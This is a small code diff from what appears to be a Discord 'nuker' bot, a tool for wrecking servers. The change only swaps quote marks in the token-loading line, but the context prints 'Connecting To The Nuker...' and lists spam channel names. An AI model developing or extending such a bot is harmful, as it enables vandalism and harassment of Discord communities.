@@ -5,7 +5,7 @@ from dotenv import load_dotenv
 
 prefix = ">"
 load_dotenv('.env')
-token = os.getenv("token")
+token = os.getenv('token')
 client = commands.Bot(command_prefix=commands.when_mentioned_or(prefix))
 print("Connecting To The Nuker...")
 SPAM_CHANNEL =  ["Chupapi runs you", "Chupapi","Chupapi Beamed You","Beamed by chupapi"]
